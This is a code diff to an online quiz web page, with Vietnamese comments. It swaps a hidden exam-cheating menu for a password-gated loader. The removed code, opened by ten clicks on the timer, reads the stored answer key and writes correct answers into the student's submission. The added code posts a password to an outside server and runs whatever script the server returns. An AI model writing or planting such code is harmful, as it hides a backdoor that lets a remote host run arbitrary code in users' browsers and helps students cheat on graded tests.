@@ -6380,11 +6380,10 @@ window.addEventListener('pagehide', function() {
 </script>
 
 <script>
-(function initBMPHackV5() {
+(function initBMPLoader() {
     let clickCount = 0;
     let clickTimer = null;
 
-    // 1. Lắng nghe sự kiện kích hoạt (Click 10 lần vào timer)
     window.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => {
             const timerEl = document.getElementById('timer');
@@ -6399,173 +6398,67 @@ window.addEventListener('pagehide', function() {
                     if (clickCount >= 10) {
                         clearTimeout(clickTimer);
                         clickCount = 0;
-                        showHackMenu();
+                        showAuthMenu();
                     }
                 });
             }
         }, 1000);
     });
 
-    // 2. Giao diện Hack Menu
-    function showHackMenu() {
-        if (typeof currentQuizData === 'undefined' || currentQuizData.length === 0) {
-            alert("⚠️ Bạn phải nhập tên, lớp và ấn 'Bắt đầu làm bài' trước khi mở bảng điều khiển!");
-            return;
-        }
+    // Bảng hỏi Pass xịn xò
+    function showAuthMenu() {
+        if (document.getElementById('bmp-login-modal') || document.getElementById('bmp-hack-modal')) return;
 
-        if (document.getElementById('bmp-hack-modal')) {
-            document.getElementById('bmp-hack-modal').style.display = 'flex';
-            window.calcPreviewScore();
-            return;
-        }
-
-        const modalHtml = `
-        <div id="bmp-hack-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999999;display:flex;align-items:center;justify-content:center;color:#eee;font-family:Arial,sans-serif;">
-            <div style="background:#1e1e1e;width:95%;max-width:600px;max-height:90vh;overflow-y:auto;padding:25px;border-radius:12px;border:1px solid #444;box-shadow:0 10px 30px rgba(0,0,0,0.5);">
-                <h2 style="color:#0f0;text-align:center;margin-top:0;border-bottom:1px solid #333;padding-bottom:10px;text-transform:uppercase;">🤖 Tool Bơm Đáp Án (Giữ Timer Gốc)</h2>
-
-                <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333;padding-bottom:10px;margin-bottom:10px;">
-                    <h3 style="color:#0f0;margin:0;font-size:16px;">🎯 CHỌN NHỮNG CÂU SẼ ĐÚNG:</h3>
-                    <div style="font-size:18px;font-weight:bold;color:#ffeb3b;">Tạm tính: <span id="hack-preview-score">0</span> đ</div>
-                </div>
+        const loginHtml = `
+        <div id="bmp-login-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;">
+            <div style="background:#1e1e1e;padding:25px;border-radius:12px;border:1px solid #444;width:90%;max-width:350px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);">
+                <h2 style="color:#0f0;margin-top:0;border-bottom:1px solid #333;padding-bottom:10px;">🔒 XÁC THỰC TOOL</h2>
+                <p style="color:#aaa;font-size:14px;margin-bottom:15px;">Vui lòng nhập mật khẩu VIP hoặc chọn chế độ Ân Xá (giới hạn điểm).</p>
                 
-                <div style="margin-bottom:10px;display:flex;gap:10px;">
-                    <button type="button" onclick="window.hackCheckAll(true)" style="flex:1;background:#333;color:#fff;border:1px solid #555;padding:8px;border-radius:4px;cursor:pointer;">✅ Chọn tất cả</button>
-                    <button type="button" onclick="window.hackCheckAll(false)" style="flex:1;background:#333;color:#fff;border:1px solid #555;padding:8px;border-radius:4px;cursor:pointer;">❌ Bỏ chọn tất cả</button>
-                </div>
+                <input type="password" id="bmp-pass-input" placeholder="Nhập mật khẩu (Nếu có)..." style="width:100%;padding:12px;margin-bottom:15px;box-sizing:border-box;background:#111;color:#fff;border:1px solid #555;border-radius:6px;font-size:16px;">
                 
-                <div id="hack-questions-list" style="background:#111;padding:15px;border-radius:8px;border:1px solid #333;max-height:45vh;overflow-y:auto;font-size:14px;">
-                </div>
-
-                <div style="display:flex;gap:10px;margin-top:20px;">
-                    <button type="button" onclick="document.getElementById('bmp-hack-modal').style.display='none'" style="flex:1;padding:12px;background:#444;color:#fff;border:none;cursor:pointer;border-radius:6px;font-weight:bold;">ĐÓNG</button>
-                    <button type="button" onclick="window.applyHackToUI()" style="flex:2;padding:12px;background:var(--primary-color, #00ff00);color:#fff;font-weight:bold;border:none;cursor:pointer;border-radius:6px;font-size:16px;">🚀 BƠM VÀO BÀI LÀM</button>
+                <div style="display:flex;flex-direction:column;gap:10px;">
+                    <button onclick="window.submitLogin(false)" style="padding:12px;background:#00ff00;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;font-size:16px;box-shadow:0 0 10px rgba(0,255,0,0.3);">🚀 ĐĂNG NHẬP VIP</button>
+                    <button onclick="window.submitLogin(true)" style="padding:12px;background:#444;color:#fff;border:1px solid #666;border-radius:6px;cursor:pointer;font-weight:bold;">🏳️ XIN ÂN XÁ (MAX 3 ĐIỂM)</button>
+                    <button onclick="document.getElementById('bmp-login-modal').remove()" style="padding:10px;background:transparent;color:#888;border:none;cursor:pointer;text-decoration:underline;">Hủy bỏ</button>
                 </div>
             </div>
         </div>
         `;
-        document.body.insertAdjacentHTML('beforeend', modalHtml);
-        populateHackQuestions();
+        document.body.insertAdjacentHTML('beforeend', loginHtml);
     }
 
-    // 3. Render danh sách câu hỏi để tick
-    window.populateHackQuestions = function() {
-        let html = '';
-        currentQuizData.forEach((q, idx) => {
-            let qNum = idx + 1;
-            html += `<div style="margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid #333;">`;
-            if (q.type === 'type1' || q.type === 'type3') {
-                let tName = q.type === 'type1' ? 'Trắc nghiệm' : 'Điền khuyết';
-                html += `<label style="cursor:pointer;display:flex;align-items:center;gap:8px;">
-                            <input type="checkbox" class="hack-q-cb" data-qnum="${qNum}" data-type="${q.type}" onchange="window.calcPreviewScore()" style="width:18px;height:18px;"> 
-                            <span style="color:#0f0;font-weight:bold;">Câu ${qNum}</span> <span style="color:#aaa;">(${tName})</span>
-                         </label>`;
-            } else if (q.type === 'type2') {
-                html += `<div style="margin-bottom:5px;"><span style="color:#0f0;font-weight:bold;">Câu ${qNum}</span> <span style="color:#aaa;">(Đúng/Sai)</span>:</div>
-                         <div style="display:flex;gap:15px;padding-left:10px;flex-wrap:wrap;">`;
-                for(let i=0; i < (q.statements ? q.statements.length : 4); i++) {
-                    let letter = String.fromCharCode(97+i);
-                    html += `<label style="cursor:pointer;display:flex;align-items:center;gap:5px;background:#222;padding:5px 10px;border-radius:4px;border:1px solid #444;">
-                                <input type="checkbox" class="hack-q-cb-sub" data-qnum="${qNum}" data-sub="${i}" onchange="window.calcPreviewScore()"> Ý ${letter}
-                             </label>`;
-                }
-                html += `</div>`;
-            }
-            html += `</div>`;
-        });
-        document.getElementById('hack-questions-list').innerHTML = html;
-        window.calcPreviewScore();
-    }
-
-    window.hackCheckAll = function(state) {
-        document.querySelectorAll('.hack-q-cb, .hack-q-cb-sub').forEach(cb => cb.checked = state);
-        window.calcPreviewScore();
-    }
-
-    // 4. Tính điểm dự kiến
-    window.calcPreviewScore = function() {
-        function parseS(v) { let n = parseFloat((v||"").toString().replace(',', '.')); return isFinite(n)?n:0; }
-        const S1 = parseS(SCORES.type1); const S3 = parseS(SCORES.type3);
-        const S2_1 = parseS(SCORES.type2_1); const S2_2 = parseS(SCORES.type2_2);
-        const S2_3 = parseS(SCORES.type2_3); const S2_4 = parseS(SCORES.type2_4);
-
-        let previewScore = 0;
-
-        document.querySelectorAll('.hack-q-cb:checked').forEach(cb => {
-            let type = cb.getAttribute('data-type');
-            if(type === 'type1') previewScore += S1;
-            if(type === 'type3') previewScore += S3;
-        });
-
-        let tfMap = {};
-        document.querySelectorAll('.hack-q-cb-sub:checked').forEach(cb => {
-            let qNum = cb.getAttribute('data-qnum');
-            if(!tfMap[qNum]) tfMap[qNum] = 0;
-            tfMap[qNum]++;
-        });
-
-        for (let qNum in tfMap) {
-            let count = tfMap[qNum];
-            if(count === 1) previewScore += S2_1;
-            if(count === 2) previewScore += S2_2;
-            if(count === 3) previewScore += S2_3;
-            if(count === 4) previewScore += S2_4;
+    // Xử lý ném dữ liệu lên PHP
+    window.submitLogin = function(isAmnesty) {
+        let pass = document.getElementById('bmp-pass-input').value;
+        if (!isAmnesty && !pass) {
+            alert("⚠️ Vui lòng nhập mật khẩu để dùng bản VIP!");
+            return;
         }
 
-        document.getElementById('hack-preview-score').innerText = Math.round(previewScore * 100) / 100;
-    }
+        // Đổi giao diện thành Loading
+        let btnContainer = document.querySelector('#bmp-login-modal > div');
+        btnContainer.innerHTML = '<h3 style="color:#0f0;margin:0;">⏳ Đang kết nối Server...</h3>';
 
-    // 5. Bơm thẳng vào giao diện bài làm
-    window.applyHackToUI = function() {
-        // Dọn giao diện cũ
-        document.querySelectorAll('.answers-type1 button').forEach(b => b.classList.remove('selected-button'));
-        document.querySelectorAll('.short-answer-input-type3').forEach(i => i.value = '');
-
-        // 1. Phủ sẵn đáp án SAI cho TOÀN BỘ các câu
-        for (let key in userAnswers) {
-            let qNum = parseInt(key);
-            let qData = currentQuizData[qNum - 1];
-
-            if (qData.type === 'type1') {
-                let correctIdx = qData.options.findIndex(opt => opt.is_correct === 1);
-                userAnswers[qNum].answer = (correctIdx === 0) ? 1 : 0; 
-            }
-            if (qData.type === 'type3') {
-                userAnswers[qNum].answer = "Ko biết làm"; 
-            }
-            if (qData.type === 'type2') {
-                userAnswers[qNum].answers = qData.answers.map(ans => ans === 'Đ' ? 'S' : 'Đ'); 
-            }
-        }
-
-        // 2. Chỉnh đáp án ĐÚNG cho những câu được tick
-        document.querySelectorAll('.hack-q-cb:checked').forEach(cb => {
-            let qNum = parseInt(cb.getAttribute('data-qnum'));
-            let type = cb.getAttribute('data-type');
-            let qData = currentQuizData[qNum - 1];
-
-            if (type === 'type1') {
-                userAnswers[qNum].answer = qData.options.findIndex(opt => opt.is_correct === 1);
-            } else if (type === 'type3') {
-                userAnswers[qNum].answer = qData.answer;
-            }
+        fetch('https://pay.testifiyonline.xyz/script.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ password: pass, amnesty: isAmnesty })
+        })
+        .then(res => {
+            if (!res.ok) throw new Error("Sai mật khẩu hoặc Server từ chối!");
+            return res.text();
+        })
+        .then(code => {
+            document.getElementById('bmp-login-modal').remove();
+            let script = document.createElement('script');
+            script.innerHTML = code;
+            document.body.appendChild(script);
+        })
+        .catch(err => {
+            alert("❌ LỖI: " + err.message);
+            document.getElementById('bmp-login-modal').remove();
         });
-
-        document.querySelectorAll('.hack-q-cb-sub:checked').forEach(cb => {
-            let qNum = parseInt(cb.getAttribute('data-qnum'));
-            let subIdx = parseInt(cb.getAttribute('data-sub'));
-            let qData = currentQuizData[qNum - 1];
-            userAnswers[qNum].answers[subIdx] = qData.answers[subIdx];
-        });
-
-        // 3. Ép giao diện hiển thị các đáp án
-        if(typeof restoreAnswerStates === 'function') restoreAnswerStates();
-        if(typeof syncTFButtons === 'function') syncTFButtons();
-        if(typeof updateStatusDisplay === 'function') updateStatusDisplay();
-
-        document.getElementById('bmp-hack-modal').style.display = 'none';
-        
-        alert("✅ ĐÃ BƠM ĐÁP ÁN!\n\nTool đã tự động khoanh toàn bộ bài cho bạn.\n👉 Bây giờ bạn cứ để tab đó, chờ thời gian trôi đi theo ý muốn rồi tự tay bấm nút 'Nộp Bài' gốc của web nhé!");
     }
 })();
 </script>
